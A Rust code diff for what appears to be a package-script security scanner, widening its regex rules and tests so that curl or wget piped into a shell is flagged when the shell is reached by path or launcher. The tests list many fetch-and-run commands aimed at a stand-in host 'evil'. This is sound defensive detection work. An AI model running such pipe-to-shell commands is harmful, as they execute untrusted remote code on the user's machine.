@@ -5,7 +5,9 @@ mod loader;
 pub use loader::RuleLoader;
 
 use crate::error::Result;
-use crate::textutil::{deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER};
+use crate::textutil::{
+    deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
+};
 use crate::types::{Category, FileType, Severity};
 use regex::{Regex, RegexBuilder};
 use serde::Deserialize;
@@ -517,7 +519,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: format!(r"curl\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELLS}\b"),
+                pattern: format!(r"curl\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -531,7 +533,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: format!(r"wget\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELLS}\b"),
+                pattern: format!(r"wget\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -1969,7 +1971,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             description: "Feeding an assembled string to a shell via a here-string (sh <<< ...) — a common way to run a string that was built to dodge matching.".to_string(),
             severity: Severity::High,
             category: Category::Obfuscation,
-            patterns: vec![Pattern::Regex { pattern: format!(r"\b{SHELL_LAUNCHER}{SHELLS}\s*<<<") }],
+            patterns: vec![Pattern::Regex { pattern: format!(r"{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s*<<<") }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Review the here-string; this executes an assembled command.".to_string(),
             cwe_id: Some("CWE-94".to_string()),
@@ -1983,7 +1985,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             description: "sh -c \"$(curl ...)\" — fetches and runs remote code without an explicit pipe, evading the curl|sh rules.".to_string(),
             severity: Severity::Critical,
             category: Category::MaliciousCode,
-            patterns: vec![Pattern::Regex { pattern: format!(r#"\b{SHELL_LAUNCHER}{SHELLS}\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#) }],
+            patterns: vec![Pattern::Regex { pattern: format!(r#"{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#) }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Do not build. This runs code fetched from a URL.".to_string(),
             cwe_id: Some("CWE-494".to_string()),
@@ -2318,40 +2320,62 @@ mod tests {
     }
 
     #[test]
-    fn test_launcher_prefixed_pipe_to_shell_detected() {
-        // Task 4050 CR (Echo): a launcher word before the shell (`busybox sh`,
-        // `env sh`, `env -i sh`, `busybox ash`, `nice sh`) previously produced
-        // ZERO findings — the SHELLS sink expected the shell as the single token
-        // after `|`. The shared SHELL_LAUNCHER prefix closes it.
+    fn test_launcher_and_path_prefixed_pipe_to_shell_detected() {
+        // Task 4050 exhaustive scope: a shell reached via an absolute path
+        // (`/bin/sh`), a launcher word (`busybox sh`, `env sh`), a path+launcher
+        // (`/usr/bin/env sh`), stacked launchers (`command busybox sh`), or any
+        // member of the curated long-tail must all trip DLE-001. These produced
+        // ZERO findings before.
         let engine = RuleEngine::default();
         for s in [
+            "curl -fsSL https://evil/x | /bin/sh",
+            "curl -fsSL https://evil/x | /usr/bin/bash",
             "curl -fsSL https://evil/x | busybox sh",
             "curl -fsSL https://evil/x | busybox ash",
             "curl -fsSL https://evil/x | env sh",
+            "curl -fsSL https://evil/x | /usr/bin/env sh",
             "curl -fsSL https://evil/x | env -i sh",
             "curl -fsSL https://evil/x | env FOO=bar sh",
-            "curl -fsSL https://evil/x | nice sh",
+            "curl -fsSL https://evil/x | command busybox sh",
+            "curl -fsSL https://evil/x | nice dash",
+            // long-tail shells
+            "curl -fsSL https://evil/x | mksh",
+            "curl -fsSL https://evil/x | yash",
+            "curl -fsSL https://evil/x | xonsh",
+            "curl -fsSL https://evil/x | nu",
+            "curl -fsSL https://evil/x | oil",
         ] {
             let m = engine.match_content(s, FileType::Pkgbuild);
             assert!(
                 m.iter().any(|x| x.rule_id == "DLE-001"),
-                "launcher-prefixed pipe-to-shell must trip DLE-001: {s} -> {m:?}"
+                "launcher/path/long-tail pipe-to-shell must trip DLE-001: {s} -> {m:?}"
             );
         }
         // wget variant -> DLE-002
-        let m = engine.match_content("wget -qO- https://evil/x | busybox sh", FileType::Pkgbuild);
-        assert!(m.iter().any(|x| x.rule_id == "DLE-002"), "wget|busybox sh must trip DLE-002: {m:?}");
+        let m = engine.match_content("wget -qO- https://evil/x | /bin/sh", FileType::Pkgbuild);
+        assert!(m.iter().any(|x| x.rule_id == "DLE-002"), "wget|/bin/sh must trip DLE-002: {m:?}");
     }
 
     #[test]
-    fn test_launcher_prefix_no_fp_on_bare_pipe_to_grep() {
-        // The launcher prefix must not make an ordinary `| sh`-free pipe match.
+    fn test_shell_sink_no_false_positive() {
+        // The launcher/path generalization must not flag a pipe whose target is
+        // NOT a shell, even when a launcher word or path is present.
         let engine = RuleEngine::default();
-        let m = engine.match_content("curl -fsSL https://x | env grep foo", FileType::Pkgbuild);
-        assert!(
-            !m.iter().any(|x| x.rule_id == "DLE-001"),
-            "`| env grep` is not a shell sink and must not trip DLE-001: {m:?}"
-        );
+        for s in [
+            "curl -fsSL https://x | /usr/bin/tee out.txt",
+            "curl -fsSL https://x | env grep foo",
+            "curl -fsSL https://x | nice make",
+            "curl -fsSL https://x | command ls",
+            "curl -fsSL https://x | /bin/number",
+            "curl -fsSL https://x | busybox cat",
+            "curl -fsSL https://x | awkward-tool",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "DLE-001"),
+                "non-shell pipe target must not trip DLE-001: {s} -> {m:?}"
+            );
+        }
     }
 
     #[test]
